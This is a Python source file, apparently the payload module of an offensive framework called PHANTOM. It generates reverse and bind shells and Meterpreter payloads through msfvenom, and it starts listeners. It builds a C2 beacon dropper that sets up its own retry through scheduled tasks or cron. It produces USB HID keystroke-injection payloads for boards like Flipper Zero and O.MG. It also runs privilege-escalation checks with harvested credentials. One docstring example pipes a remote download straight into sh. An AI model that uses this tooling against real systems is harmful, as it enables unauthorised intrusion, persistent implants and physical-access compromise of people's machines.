import os
import socket
from phantom.modules.base_module import BaseModule
from phantom.core.executor import run_command
from phantom.core.session import session
from phantom.utils.notifier import notifier
from rich.console import Console

console = Console()

PAYLOAD_TYPES = {
    "1": ("linux/x64/shell_reverse_tcp",         "Reverse shell TCP (Linux x64)"),
    "2": ("linux/x64/shell_bind_tcp",            "Bind shell TCP (Linux x64)"),
    "3": ("linux/x64/meterpreter/reverse_tcp",   "Meterpreter reverse TCP (Linux x64)"),
    "4": ("linux/x64/meterpreter/reverse_https", "Meterpreter reverse HTTPS (Linux x64)"),
    "5": ("linux/x86/shell_reverse_tcp",         "Reverse shell TCP (Linux x86)"),
    "6": ("windows/x64/shell_reverse_tcp",       "Reverse shell TCP (Windows x64)"),
    "7": ("windows/x64/meterpreter/reverse_tcp", "Meterpreter reverse TCP (Windows x64)"),
    "8": ("windows/x86/shell_reverse_tcp",       "Reverse shell TCP (Windows x86)"),
}

FORMATS = {
    "1": ("elf",  "ELF (Linux binary)"),
    "2": ("py",   "Python"),
    "3": ("sh",   "Bash one-liner"),
    "4": ("php",  "PHP"),
    "5": ("ps1",  "PowerShell"),
    "6": ("exe",  "Windows EXE"),
    "7": ("asp",  "ASP"),
    "8": ("war",  "WAR (Tomcat)"),
}


def _detect_os_from_xml(target: str) -> str:
    """
    Read OS detection results from the Nmap XML saved during scan.
    Returns a human-readable OS string, or empty string if not found.
    """
    from phantom.utils.paths import scan_xml_path
    xml_path = scan_xml_path(target)
    if not os.path.exists(xml_path):
        return ""

    try:
        import xml.etree.ElementTree as ET
        tree = ET.parse(xml_path)
        root = tree.getroot()

        for host in root.findall("host"):
            os_elem = host.find("os")
            if os_elem is None:
                continue

            # osmatch contains the best guess with accuracy percentage
            best_match = None
            best_accuracy = 0

            for osmatch in os_elem.findall("osmatch"):
                accuracy = int(osmatch.get("accuracy", "0"))
                if accuracy > best_accuracy:
                    best_accuracy = accuracy
                    best_match = osmatch.get("name", "")

            if best_match and best_accuracy >= 85:
                return best_match

    except Exception:
        pass

    return ""


def _os_to_payload_hint(os_string: str) -> tuple:
    """
    Given an OS string, return the (arch, platform) payload hint.

    The classification belongs to `phantom.utils.target_platform` (ONE
    source shared with the agent, the C2 shell and the network map): this
    function only keeps the module's historical (arch, platform) shape.
    """
    from phantom.utils.target_platform import from_os_string
    answer = from_os_string(os_string, source="os string")
    if not answer.platform:
        # no family in the string: keep the module's historical linux
        # default, but the ARCH it stated is still real information
        # ("Unknown i386 OS" is 32-bit even though it names no family)
        return answer.arch, "linux"      # caller warns: see `_guess_os`
    return answer.arch, answer.platform


class PayloadModule(BaseModule):
    module_name = "payload"

    def build_commands(self) -> dict:
        return self._with_suggestions(
            {
                "CORE": ["generate", "reverse [lhost] [lport]",
                          "bind [port]", "deploy", "privesc"],
                "DELIVERY": ["hid <board> \"<command>\" [--target <os>] "
                             "[--stager <os>] [--out <file>]"],
                "LISTENER": ["handler <port> <payload>"],
            },
            self.suggest_commands(),
        )

    def suggest_commands(self) -> dict:
        """Platform-aware payload generation for the detected target OS."""
        from phantom.modules.suggest import payload_suggestion_group
        return payload_suggestion_group()

    def do_reverse(self, arg):
        """reverse [lhost] [lport] — synthesize a multi-dialect reverse
        shell with the enterprise payload engine (the same one the
        auto-mode ships): best dialect for the target platform, optional
        base64 encoder, automatic listener, and the beacon upgrade path."""
        from phantom.automation.brain.payload import get_payload_engine
        os_string, arch, platform = self._guess_os()
        parts = (arg or "").split()
        lhost = parts[0] if parts else self._get_lhost()
        try:
            lport = int(parts[1]) if len(parts) > 1 else \
                    int(session.lport or 4444)
        except (TypeError, ValueError):
            lport = 4444
        engine = get_payload_engine()
        options = engine.reverse_options(platform)
        console.print(f"\n[bold]-- REVERSE SHELL ({platform} · {os_string}) --[/]\n")
        console.print(f"  LHOST: [yellow]{lhost}[/]   LPORT: [yellow]{lport}[/]\n")
        console.print("  Dialects (best-first for this platform):")
        for i, d in enumerate(options, 1):
            marker = " [dim](best)[/]" if i == 1 else ""
            console.print(f"    [{i}] {d}{marker}")
        pick = input(f"  Dialect [1-{len(options)}] [1]: ").strip() or "1"
        try:
            dialect = options[int(pick) - 1]
        except (ValueError, IndexError):
            notifier.error("Invalid dialect.")
            return
        enc = input("  Encoder [plain|base64] [plain]: ").strip() or "plain"
        if enc not in engine.ENCODERS:
            notifier.error("Invalid encoder.")
            return
        payload = engine.reverse(platform, lhost, lport,
                                 dialect=dialect, encoder=enc)
        console.print(f"\n  [bold green][+] {payload.note}[/]")
        console.print(f"      [yellow]{payload.command}[/]\n")
        # optional automatic listener
        act = input("  Start listener now? [y/N]: ").strip().lower()
        if act.startswith("y"):
            from phantom.modules.handler import HandlerModule
            HandlerModule().do_nc(str(lport))
        console.print("  [dim]Next:\t'use payload' → deploy  (or 'use exploit' →"
                      " deploy-agent) upgrades this foothold to the C2\n"
                      "  beacon — full post-exploitation over the encrypted"
                      " channel.[/]")
        session.add_note(f"Reverse shell ({dialect}/{enc}) {lhost}:{lport}")

    def do_bind(self, arg):
        """bind [port] — synthesize a BIND shell (target listens).
        LOUD BY NATURE: only use when outbound egress is blocked."""
        from phantom.automation.brain.payload import get_payload_engine
        os_string, arch, platform = self._guess_os()
        try:
            port = int((arg or "").split()[0]) if (arg or "").split() else 4444
        except ValueError:
            notifier.error("Usage: bind <port>")
            return
        engine = get_payload_engine()
        options = engine.bind_options(platform)
        console.print(f"\n[bold]-- BIND SHELL ({platform}) --[/]")
        console.print(f"  Target listens on port [yellow]{port}[/].\n")
        console.print("  Dialects:")
        for i, d in enumerate(options, 1):
            marker = " [dim](best)[/]" if i == 1 else ""
            console.print(f"    [{i}] {d}{marker}")
        pick = input(f"  Dialect [1-{len(options)}] [1]: ").strip() or "1"
        try:
            dialect = options[int(pick) - 1]
        except (ValueError, IndexError):
            notifier.error("Invalid dialect.")
            return
        payload = engine.bind(platform, port, dialect=dialect)
        console.print(f"\n  [bold green][+] {payload.note}[/]")
        console.print(f"      [yellow]{payload.command}[/]\n")
        notifier.warn("Bind shells are LOUD — prefer reverse unless egress "
                      "is blocked.")
        session.add_note(f"Bind shell ({dialect}) port {port}")

    def do_privesc(self, _):
        """privesc — run ACTIVE privilege-escalation enumeration on the
        target (sudo -l, SUID, writable files) using harvested creds, and
        list the matching GTFOBins/tools. Falls back to the tool list when
        no access is available yet."""
        # If we have access (creds on the target), delegate to the real
        # enumeration so this is actionable, not just a static list.
        try:
            from phantom.core.knowledge import session_wm
            if session_wm().find("creds", valid=True):
                from phantom.modules.exploit import ExploitModule
                notifier.status("Access available — running active privesc "
                                "enumeration over SSH...")
                ExploitModule().do_privesc_run("")
                console.print(
                    "\n[dim]Suggested tools for the findings above:[/]")
                console.print("  - [green]LinPEAS[/] / [green]linux-exploit-suggester[/]")
                console.print("  - [green]GTFOBins[/]: https://gtfobins.github.io")
                return
        except Exception:
            pass
        # No access yet: senior guidance + the enumeration plan to reach it.
        os_string, arch, platform = self._guess_os()
        
        console.print(f"\n[bold yellow]--- Privilege Escalation Assistant ({platform.capitalize()} {arch}) ---[/]")
        
        if platform == "windows":
            console.print("[bold]Suggested Tools:[/]")
            console.print("  - [green]WinPEAS[/]: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS")
            console.print("  - [green]PrivescCheck[/]: https://github.com/itm4n/PrivescCheck")
            console.print("  - [green]Seatbelt[/]: https://github.com/GhostPack/Seatbelt")
            console.print("\n[bold]Suggested Techniques:[/]")
            console.print("  - Check for Unquoted Service Paths")
            console.print("  - Check for AlwaysInstallElevated registry key")
            console.print("  - Check for Token Impersonation (SeImpersonatePrivilege)")
        else:
            console.print("[bold]Suggested Tools:[/]")
            console.print("  - [green]LinPEAS[/]: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS")
            console.print("  - [green]Linux Smart Enumeration (lse.sh)[/]: https://github.com/diego-treitos/linux-smart-enumeration")
            console.print("  - [green]linux-exploit-suggester[/]: https://github.com/The-Z-Old-GitHub-Repo-of-Linux-Exploit-Suggester/linux-exploit-suggester")
            console.print("\n[bold]Suggested Techniques:[/]")
            console.print("  - Check for SUID binaries (`find / -perm -u=s -type f 2>/dev/null`) ")
            console.print("  - Check for writable /etc/passwd or /etc/shadow")
            console.print("  - Check sudo permissions (`sudo -l`)")

    def do_hid(self, arg):
        """hid <board> ["<command>" | --stager <os>] [flags]

        Build a USB HID payload for a keyboard-injector board: AutoRun on
        removable volumes is dead at the OS level, so the vector that works
        is a board that TYPES the payload (RP2040/Pico with CircuitPython,
        Flipper Zero BadUSB, O.MG cable, Arduino-IDE `Keyboard.h` boards).

        Flags:
          --target <os>   the OS the board will type into (windows|linux|
                          macos|android): the command must match it, and
                          nothing can detect it at runtime (9.2)
          --layout <l>    the keyboard layout the TARGET has active
                          (us|it, default us). The board sends US scan
                          codes, so on an Italian target / ( = {} @ # come
                          out wrong unless the command is pre-translated
                          for that layout.
          --stager <os>   build the PHANTOM stager for that OS with the
                          current C2 endpoint and type THAT (instead of
                          pasting a command by hand). The stager is
                          RESILIENT: if the C2 is down when the board is
                          plugged in, it schedules its own retry (Windows
                          scheduled task / POSIX cron) so the beacon still
                          lands once the C2 comes up — the operator types
                          it once and walks away.
          --out <file>    where to write the artefact (default:
                          data/vectors/)
          --delay <ms>    wait before typing (default 1500: the host has to
                          enumerate the HID device first)
          --no-enter      do not press Enter after the command
          --run           open the run dialog first (Windows targets)

        Examples:
          payload hid pico --stager windows --target windows --run
          payload hid flipper "curl -sk http://10.0.0.5:8443/x | sh" \
              --target linux
          payload hid omg --stager linux --target linux
          payload hid arduino --stager windows --target windows --run \
              --layout it
        """
        from phantom.utils.hid_builder import (
            ARDUINO_BOARDS, BOARDS, board_notes, build_hid_payload)

        parts = arg.strip().split()
        board = ""
        command = ""
        target = ""
        stager = ""
        layout = "us"
        out = ""
        delay_ms = 1500
        press_enter = True
        open_run = False

        i = 0
        while i < len(parts):
            tok = parts[i]
            if tok == "--target" and i + 1 < len(parts):
                target = parts[i + 1].lower()
                i += 2
                continue
            if tok == "--stager" and i + 1 < len(parts):
                stager = parts[i + 1].lower()
                i += 2
                continue
            if tok == "--layout" and i + 1 < len(parts):
                layout = parts[i + 1].lower()
                i += 2
                continue
            if tok == "--out" and i + 1 < len(parts):
                out = parts[i + 1]
                i += 2
                continue
            if tok == "--delay" and i + 1 < len(parts):
                try:
                    delay_ms = int(parts[i + 1])
                except ValueError:
                    notifier.error("--delay wants milliseconds")
                    return
                i += 2
                continue
            if tok == "--no-enter":
                press_enter = False
                i += 1
                continue
            if tok == "--run":
                open_run = True
                i += 1
                continue
            if not board and tok.lower() in BOARDS:
                board = tok.lower()
                i += 1
                continue
            # anything left is the command to type (quotes already stripped
            # by the shell / the module's argument splitter)
            command = (command + " " + tok).strip()
            i += 1

        if not board:
            notifier.error(f"hid wants a board: {', '.join(BOARDS)}")
            return
        if stager:
            if target and target != stager:
                notifier.error(
                    f"--stager {stager} but --target {target}: the board "
                    f"types one artefact and PE ≠ ELF ≠ Mach-O — pick one.")
                return
            from phantom.utils.builder import generate_dropper
            from phantom.utils import config as cfg
            host = session.lhost or self._get_lhost()
            port = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
            command = generate_dropper(stager, host, port, use_ssl=True,
                                       resilient=True)
            target = target or stager
            notifier.info(f"stager for {stager} built with the current C2 "
                          f"endpoint ({host}:{port})")
        if not command:
            notifier.error("hid wants the command to type (or --stager <os>)")
            return
        try:
            payload = build_hid_payload(board, command, target=target,
                                        layout=layout,
                                        delay_ms=delay_ms,
                                        press_enter=press_enter,
                                        open_run=open_run)
        except ValueError as exc:
            notifier.error(str(exc))
            return

        import os
        if not out:
            from phantom.utils.paths import data_dir
            name = f"{board}_{payload.filename}"
            if board in ARDUINO_BOARDS:
                # the Arduino IDE refuses a sketch whose folder is not named
                # after the .ino file: put it in a folder of the same name
                stem = os.path.splitext(name)[0]
                name = os.path.join(stem, f"{stem}.ino")
            out = os.path.join(data_dir(), "vectors", name)
        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
        with open(out, "w", encoding="utf-8", newline="\n") as handle:
            handle.write(payload.content)
        notifier.success(f"HID payload written: {out}")
        for note in payload.notes:
            notifier.warn(note)
        for note in board_notes(board):
            notifier.info(note)
        session.add_note(f"HID payload ({board}) -> {out}")

    def _get_lhost(self) -> str:
        """Auto-detect local IP (VPN/tun0 or default route)."""
        from phantom.utils.network import get_lhost
        return get_lhost()

    def _guess_os(self) -> tuple:
        """Detect the target OS, in confidence order, and SAY when it failed.

        Sources, best first: the shared WorldModel `os` finding (the senior
        source — the scan wrote it there), the nmap XML saved by the scan,
        the raw scan output held in the session. Returns
        (os_string, arch, platform) as before.

        When nothing was detected the answer is marked ASSUMED and the
        operator is WARNED: the old code returned "Unknown (defaulting to
        Linux x64)" in silence, and the caller shipped a Linux beacon to
        targets that were never identified — the wrong kernel family, with
        no trace of the guess.
        """
        from phantom.utils.target_platform import (
            assumed_linux, from_findings, from_os_string, resolve)

        target = session.target
        answer = None

        # 0. Shared WorldModel os finding (written by scan / reasoning)
        try:
            from phantom.core.knowledge import session_wm
            answer = from_findings(session_wm(), source="shared knowledge")
        except Exception:
            answer = None

        # 1. XML-based OS detection (most accurate string available)
        if target and (answer is None or not answer.known):
            xml_os = _detect_os_from_xml(target)
            if xml_os:
                answer = resolve(answer,
                                 from_os_string(xml_os, source="scan XML"))

        # 2. Fallback: the raw scan output held in the session
        if answer is None or not answer.known:
            scan_data = session.get_result("scan")
            if scan_data and isinstance(scan_data, dict):
                text = " ".join(str(v) for v in scan_data.values())
                if text.strip():
                    answer = resolve(answer,
                                     from_os_string(text, source="scan output"))

        # 3. Nothing detected: state the default instead of hiding it
        if answer is None or not answer.known:
            answer = assumed_linux("no os signal")
            notifier.warn(
                f"OS del target non rilevato: uso il default "
                f"{answer.platform}/{answer.arch} — se il target è "
                f"Windows/macOS compila l'artefatto giusto (es. "
                f"`generate windows`) o esegui un os_detect.")
        return answer.os_name, answer.arch, answer.platform

    def _suggest_payload(self, arch: str, platform: str) -> str:
        """Return the suggested payload key based on detected OS."""
        if platform == "windows":
            return "7" if arch == "x64" else "8"  # windows meterpreter or shell
        else:
            return "3" if arch == "x64" else "5"  # linux meterpreter or x86 shell

    def _suggest_format(self, platform: str) -> str:
        """Return suggested format key based on platform."""
        return "6" if platform == "windows" else "1"  # exe or elf

    def do_deploy(self, _):
        """deploy — build and preflight PHANTOM's OWN C++ beacon dropper for
        the detected target platform (the same binary the auto-mode ships),
        then print the one-liner to execute on the target."""
        os_string, arch, platform = self._guess_os()
        from phantom.utils import config as cfg
        c2_host = str(cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
        c2_port = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
        notifier.info(f"Target platform: {platform} ({arch}) — {os_string}")
        notifier.info(f"C2 callback: {c2_host}:{c2_port}")
        try:
            from phantom.utils.builder import generate_dropper, compile_beacon
            from phantom.utils.c2_crypto import beacon_config_endpoint
            import phantom
            beacon_dir = os.path.join(os.path.dirname(phantom.__file__),
                                      "payloads", "beacon")
            # rebuild only when the embedded ENDPOINT changed (comparing the
            # whole generated header always differed, forcing a full
            # recompile on every build)
            binary = compile_beacon(
                platform, os.path.dirname(phantom.__file__),
                force_rebuild=(beacon_config_endpoint(beacon_dir)
                               != (c2_host, c2_port)), arch=arch,
                host=c2_host, port=c2_port, use_ssl=True)
            if not binary:
                notifier.error("Beacon build failed (cross-toolchain missing?)")
                return
        except Exception as e:
            notifier.error(f"Beacon build failed: {e}")
            return
        # sandbox preflight of the compiled binary (best-effort: backends
        # missing just means 'no verdict', never a crash)
        try:
            from phantom.automation.sandbox.sandbox import SandboxEngine
            verdict = SandboxEngine().preflight(binary)
            if verdict.approved:
                notifier.success("Sandbox preflight: APPROVED.")
            else:
                notifier.warn(f"Sandbox preflight: {verdict.summary()}")
        except Exception:
            notifier.warn("Sandbox preflight unavailable (no backend) — skipping.")
        # RESILIENT by default: this one-liner is pasted by hand and may be
        # run before the C2 is up (a physical drop, a staged exfil). If the
        # first download fails it schedules its own retry with the endpoint
        # already embedded, so the operator types it once and walks away.
        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True,
                                   resilient=True)
        if not dropper:
            notifier.error("No dropper defined for this platform.")
            return
        console.print(f"\n[bold green][+] Deploy command (run on target):[/]")
        console.print(f"    [yellow]{dropper}[/]\n")
        session.add_note(f"Payload: {platform} beacon built for {c2_host}:{c2_port}")
        notifier.info("The beacon checks in to your C2 — 'phantom --c2' -> "
                      "'beacons' to interact.")

    def do_generate(self, _):
        """Interactive payload generation wizard with auto OS/arch detection."""
        console.print("\n[bold]-- PAYLOAD GENERATOR --[/]\n")

        # Auto-detect
        os_string, arch, platform = self._guess_os()
        lhost = self._get_lhost()

        notifier.info(f"Auto-detected Target OS: {os_string} ({arch})")
        notifier.info(f"LHOST: {lhost}")
        notifier.info(f"Target: {session.target or 'not set'}")
        console.print()

        # Payload types (include custom)
        from phantom.utils.payload_manager import get_custom_beacons
        custom_beacons = get_custom_beacons()
        
        all_payloads = PAYLOAD_TYPES.copy()
        
        # Add custom beacons as entries 9, 10, ...
        custom_mapping = {}
        for i, beacon in enumerate(custom_beacons, start=9):
            all_payloads[str(i)] = (beacon["command"], f"{beacon['description']} ({beacon['platform']})")
            custom_mapping[str(i)] = beacon

        # Payload type
        suggested_payload = self._suggest_payload(arch, platform)
        for k, (_, desc) in all_payloads.items():
            marker = " [dim](suggested)[/]" if k == suggested_payload else ""
            console.print(f"  [{k}] {desc}{marker}")

        while True:
            payload_choice = input(f"\n  Payload type [{suggested_payload}]: ").strip() or suggested_payload
            
            # Allow exit commands
            if payload_choice.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            # Validate choice
            if payload_choice in all_payloads or payload_choice in custom_mapping:
                break
            else:
                notifier.error(f"Invalid choice '{payload_choice}'. Enter a number from the list, or 'back' to exit.")
        
        if payload_choice in custom_mapping:
            beacon = custom_mapping[payload_choice]
            cmd = beacon['command']

            console.print(f"\n[bold green]Custom Beacon:[/bold green] [yellow]{beacon['description']}[/yellow]")
            console.print(f"[bold]Deployment command (to run on target):[/bold]\n    [yellow]{cmd}[/]\n")

            # Remove auto-execution because it runs LOCALLY on the pentester's machine.
            # Instead, just provide the command and instructions.
            notifier.info("Copy the command above and execute it on the compromised target.")
            notifier.warn("Note: Automatic execution is disabled for security reasons (it would run locally).")
            return

        payload_str, payload_desc = all_payloads.get(payload_choice, PAYLOAD_TYPES[suggested_payload])

        # Output format
        suggested_fmt = self._suggest_format(platform)
        console.print()
        for k, (_, desc) in FORMATS.items():
            marker = " [dim](suggested)[/]" if k == suggested_fmt else ""
            console.print(f"  [{k}] {desc}{marker}")

        while True:
            fmt_choice = input(f"\n  Output format [{suggested_fmt}]: ").strip() or suggested_fmt
            
            if fmt_choice.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            if fmt_choice in FORMATS:
                break
            else:
                notifier.error(f"Invalid format '{fmt_choice}'. Enter a number from the list, or 'back' to exit.")
        
        fmt_str, fmt_desc = FORMATS.get(fmt_choice, FORMATS[suggested_fmt])

        # LPORT validation
        while True:
            lport = input("  LPORT [4444]: ").strip() or "4444"
            
            if lport.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            try:
                port_num = int(lport)
                if 1 <= port_num <= 65535:
                    break
                else:
                    notifier.error(f"Port must be between 1 and 65535.")
            except ValueError:
                notifier.error(f"Invalid port '{lport}'. Enter a number 1-65535, or 'back' to exit.")
        
        out_file = input(f"  Output filename [shell.{fmt_str}]: ").strip() or f"shell.{fmt_str}"
        if out_file.lower() in ["back", "exit", "quit", "q"]:
            notifier.warn("Cancelled payload generation.")
            return

        cmd = f"msfvenom -p {payload_str} LHOST={lhost} LPORT={lport} -f {fmt_str} -o {out_file}"

        console.print(f"\n[bold][+] Generated command:[/]")
        console.print(f"    [yellow]{cmd}[/]\n")
        console.print("  [1] Execute + start listener automatically")
        console.print("  [2] Show command only (copy manually)")
        console.print("  [3] Edit command before executing")

        while True:
            action = input("\n  Choice [2]: ").strip() or "2"
            
            if action.lower() in ["back", "exit", "quit", "q"]:
                notifier.warn("Cancelled payload generation.")
                return
            
            if action in ["1", "2", "3"]:
                break
            else:
                notifier.error(f"Invalid choice '{action}'. Enter 1, 2, 3, or 'back' to exit.")

        if action == "1":
            run_command(cmd)
            notifier.success(f"Payload saved: {out_file}")
            self._start_listener(lport, payload_str)

        elif action == "2":
            console.print(f"\n  [yellow]{cmd}[/]\n")

        elif action == "3":
            new_cmd = input(f"  Edit command:\n  [{cmd}]\n  > ").strip()
            if new_cmd:
                run_command(new_cmd)
            else:
                run_command(cmd)

    def _start_listener(self, port: str, payload: str):
        """Start Metasploit multi/handler for the generated payload."""
        from phantom.modules.handler import HandlerModule
        notifier.status("Starting Metasploit listener...")
        HandlerModule().start_listener(port, payload)

    def do_run(self, _):
        self.do_generate(_)

    def _execute_flow(self, _):
        self.do_generate(_)
